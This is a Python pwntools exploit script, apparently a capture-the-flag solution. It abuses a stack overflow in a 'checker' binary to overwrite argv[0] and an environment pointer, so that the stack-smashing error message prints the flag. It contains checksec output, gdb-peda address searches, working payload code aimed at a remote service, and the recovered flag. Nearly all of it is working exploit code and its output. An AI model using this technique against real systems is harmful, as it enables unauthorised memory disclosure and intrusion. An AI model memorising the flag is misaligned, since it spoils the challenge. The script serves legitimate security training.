#!/usr/bin/env python2

"""
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : FULL

0x00601000         0x00602000         rw-p
"""

# Readme
"""
1. the buffer where to get string "yes" is  0x7fffffffdda0
2. when input "yes" can overflow the stack 
3. if we overflow the canary it will jump to   ___stack_chk_fail
4. the function __libc_message in the ___stack_chk_fail will call __libc_message(2, "*** %s ***: %s terminated\n",msg, __libc_argv[0] ?: "<unknown>");  and 
   have some error output like this " *** stack smashing detected ***: ''message''  terminated "
5. __libc_message will check if there has an environment parameter LIBC_FATAL_STDERR_, which means the output of errormessage
   if the LIBC_FATAL_STDERR_ is not set, the error message always direct to _PATH_TTY, which usually is /dev/tty 
6. Use overflow to do following things 
   (1) change the pointer of message
   (2) redirect the stderr to stdout  
"""

# find where is the string of filename   (  arg[0] -> filename )
"""
gdb-peda$ find home
Searching for 'home' in: None ranges
Found 6 results, display max 6 items:
[stack] : 0x7fffffffe2a6 ("home/user/Desktop/linux_pwn/Middle/checker")
[stack] : 0x7fffffffeb3c ("home/user/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games")
[stack] : 0x7fffffffebf6 ("home/user/Desktop/linux_pwn/Middle")
[stack] : 0x7fffffffed39 ("home/user")
[stack] : 0x7fffffffef9d ("home/user/.Xauthority")
[stack] : 0x7fffffffefcd ("home/user/Desktop/linux_pwn/Middle/checker")
"""

# find where is the pointer of arg[0]
"""
gdb-peda$ find 0x7fffffffe2a5
Searching for '0x7fffffffe2a5' in: None ranges
Found 2 results, display max 2 items:
   libc : 0x7ffff7dd4018 --> 0x7fffffffe2a5 ("/home/user/Desktop/linux_pwn/Middle/checker")
[stack] : 0x7fffffffdf18 --> 0x7fffffffe2a5 ("/home/user/Desktop/linux_pwn/Middle/checker")
"""

# choose any one env to set "LIBC_FATAL_STDERR_=1"
"""
gdb-peda$ !x
x/20s 0x7fffffffe2a5
0x7fffffffe2a5:	"/home/user/Desktop/linux_pwn/Middle/checker"
0x7fffffffe2d1:	"XDG_VTNR=7"
0x7fffffffe2dc:	"LC_PAPER=zh_TW.UTF-8"
0x7fffffffe2f1:	"LC_ADDRESS=zh_TW.UTF-8"
0x7fffffffe308:	"XDG_SESSION_ID=c2"
0x7fffffffe31a:	"XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/user"
0x7fffffffe34a:	"SELINUX_INIT=YES"
"""

# find where is the pointer
"""
gdb-peda$ find 0x7fffffffe2d1
Searching for '0x7fffffffe2d1' in: None ranges
Found 1 results, display max 1 items:
[stack] : 0x7fffffffdf28 --> 0x7fffffffe2d1 ("XDG_VTNR=7")
""" 


from pwn import *

r = remote('172.16.101.57', 12028)

#r = process('./checker')

name = 0x601040
flag = 0x6010c0

pointer_off = 0x7fffffffdf18 - 0x7fffffffdda0
env_off =     0x7fffffffdf28 - 0x7fffffffdda0


r.sendlineafter(': ','LIBC_FATAL_STDERR_=1') # send name

# cause the check of   "buf && read(0, &buf, 1uLL)"  
# it will break while we send \x00
# so  we have to send many times 

# make env = 0x00000000006010c0
for i in range(5):
	r.sendlineafter('>> ','a'*env_off+'a'*(8-i) )  # make 0x00 on the stack
payload = 'a'*env_off + p64(name)
r.sendlineafter('>> ',payload) 		     # overflow env

# make arg = 0x0000000000601040
for i in range(5):
	r.sendlineafter('>> ','b'*pointer_off + 'b'*(8-i) )
payload = 'b'*pointer_off + p64(flag)
r.sendlineafter('>> ',payload) 		     # overflow arg[0]

r.sendlineafter('>> ','yes')
r.sendlineafter(': ','lalalalala')

r.interactive()

# AD{sm4sH_Th3_sT4CK_t0_93T_Th3_fl49}

#
